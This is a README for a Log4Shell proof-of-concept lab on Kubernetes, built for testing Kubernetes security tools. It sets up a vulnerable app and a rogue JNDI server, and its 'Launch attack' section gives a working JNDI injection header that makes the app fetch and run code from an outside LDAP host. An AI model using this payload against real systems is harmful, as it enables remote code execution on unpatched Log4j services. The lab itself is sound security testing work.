# log4shell-kubernetes

A log4shell proof of concept running on Kubernetes.

This is not much different from other POCs, just automated in simple steps to test Kubernetes specific security tools.

It uses the following projects:
* https://github.com/christophetd/log4shell-vulnerable-app
* https://github.com/veracode-research/rogue-jndi

For more information, check:
* https://vicenteherrera.com/blog/log4j-part-i/

## Build and push docker images

**This step is optional**. You can build your own images if you want instead of using the ones available at [quay.io/vicenteherrera](https://quay.io/user/vicenteherrera).

```bash
# Clone this repo, including repos rogue-jndi and log4shell-vulnerable-app as submodules
git clone --recurse-submodules https://github.com/vicenteherrera/log4shell-kubernetes
# Don't forget the "--recurse-submodule" part!
cd log4shell-kubernetes

# Build and push rogue-jndi
docker build ./rogue-jndi -t quay.io/vicenteherrera/rogue-jndi -f Dockerfile-rogue-jndi
docker push quay.io/vicenteherrera/rogue-jndi

# Build and push log4shell-vulnerable-app
cd log4shell-vulnerable-app
docker build . -t quay.io/vicenteherrera/quay.io/vicenteherrera/log4shell-vulnerable-app
docker push quay.io/vicenteherrera/log4shell-vulnerable-app
cd ..
```

The provided [Dockerfile-rogue-jndi](https://github.com/vicenteherrera/log4shell-kubernetes/blob/main/Dockerfile-rogue-jndi) in this repo is set up to executed on the compromised workload the command:

```bash
touch /root/test.txt
```

## Start Minikube

If you want to test this locally, you can use [Minikube](https://minikube.sigs.k8s.io/docs/) for example.

```bash
minikube start
```

## Deploy on Kubernetes

You can use the online YAML files that points to quay.io container images, no need to clone this repo if you don't need to modify them.

```bash
# vulnerable-log4j deployment and service
kubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/vulnerable-log4j.yaml
# rogue-jndi deployment and service
kubectl apply -f https://raw.githubusercontent.com/vicenteherrera/log4shell-kubernetes/main/rogue-jndi.yaml
```

## Watch logs

```bash
# On different terminals
kubectl logs service/rogue-jndi -f
kubectl logs service/vulnerable-log4j -f
```

## Launch attack

```bash
kubectl run my-shell --rm -it --image curlimages/curl -- sh
curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://rogue-jndi:1389/o=tomcat}'
exit
```

## Check that the attack succeded on the vulnerable app

```bash
kubectl exec service/vulnerable-log4j -it -- ls /root
```

It should list `test.txt` if the attack is successful.

## Try everything using Okteto 

With [Okteto](https://www.okteto.com/) you can have an online development cluster for free.

```bash
# Deploy on Okteto cloud cluster
okteto pipeline deploy
okteto kubeconfig
# Check deployment, launch an test attack
# [...]
# Destroy Okteto cloud cluster
okteto pipeline destroy
```

## More information

* My blog post at "The Vlog": [Log4j 2 vulnerabilities, part I: History](https://vicenteherrera.com/blog/log4j-part-i/)
* Follow me on Twitter: [@vicen_herrera](https://twitter.com/vicen_herrera)
